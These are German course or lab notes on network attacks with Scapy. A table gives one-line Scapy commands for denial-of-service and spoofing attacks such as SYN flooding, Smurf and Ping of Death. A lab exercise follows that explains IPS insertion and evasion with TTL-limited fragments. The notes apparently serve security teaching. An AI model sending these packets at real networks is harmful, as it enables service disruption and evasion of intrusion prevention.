>[!danger] Angriffssimulationen mit Scapy

| Angriff           | Beschreibung                             | Beispiel                                                             |
| ----------------- | ---------------------------------------- | -------------------------------------------------------------------- |
| **Ping of Death** | Fragmentiertes Paket mit zu großer Länge | `send(fragment(ip/ICMP()/("X"*65536)))`                              |
| **IP Spoofing**   | Gefälschte Quell-IP                      | `send(IP(src="192.168.42.1", dst=dstIP)/ICMP())`                     |
| **ICMP-Nuke**     | Gefälschte ICMP-Nachrichten im Loop      | `send(IP(src="192.168.42.1", dst=dstIP)/ICMP(type=3), loop=1)`       |
| **SYN Flooding**  | DoS-Angriff mit vielen SYNs              | `send(ip/TCP(sport=RandShort(), dport=[22, 80], flags="S"), loop=1)` |
| **LAND Attack**   | DoS durch Verbindung zu sich selbst      | `send(IP(src=dstIP, dst=dstIP)/TCP(sport=80, dport=80))`             |
| **Smurf-Attack**  | ICMP an Broadcast-Adresse                | `send(IP(src=dstIP, dst="192.168.42.255")/ICMP())`                   |
#### Insertion & Evasion Attack
>[!info] Grundlage
>IPS und IDS zur Überwachung von Netzwerkverkehr und unterbinden von schadhaften Einfluss. Umgehung ist möglich durch Insertion & Evasion Varianten.
>- **Insertion**: Gesendete Pakete werden vom IPS korrekt entgegengenommen und in dessen Analysepfad aufgenommen, vom eigentlichen Zielsystem jedoch verworfen. Das IPS „sieht“ mehr Daten als das Ziel, was zu einer fehlerhaften Einschätzung des Kommunikationszustands führt.
>- **Evasion**: Gesendete Pakete werden vom IPS ignoriert oder falsch interpretiert, während das Zielsystem sie problemlos verarbeitet. Die Überwachung übersieht dadurch einen Teil der tatsächlichen Kommunikation, was eine potenzielle Bedrohung verbergen kann

>dobby.local soll wichtiges Paket erhalten "sock" aber IPS verhindert alle Übertragungen die "sock" enthalten. Lösung mittels Insertion & Evasion Paket einschleussen.
>
>Netzwerkentfernung ermitteln:
>```bash
>traceroute dobby.local

>Leider erkennt das IPS auch kleingehackte Socken. Ihr Ansatz besteht nun darin, dem IPS vorzugaukeln, dass es sich bei Ihrem Paket nicht um Socken, sondern um Steine (oder bei Bedarf auch andere Inhalte) handelt. Dazu fügen Sie ein zusätzliches Fragment INSERT ein,dessen TTL-Wert3 so angepasst wird, dass das Paket zwar das IPS erreicht, jedoch vor dem Zielsystem verworfen wird. Damit der Server kein unvollständiges Paket erhält, können Sie zusätzlich ein weiteres Fragment EVADE senden. Dieses besitzt die gleichen Metadaten wie das INSERT-Fragment (außer dem TTL-Wert), liefert jedoch andere Nutzdaten. Im IPS bleibt das EVADE-Fragment unbeachtet, da die Paketrekonstruktion bereits erfolgreich abgeschlossen wurde (ggf. wird es als Retransmission identifiziert). Auf dem Server hingegen wird es korrekt in die Paketrekonstruktion eingebunden, da das INSERT-Fragment dort keine Rolle spielt.
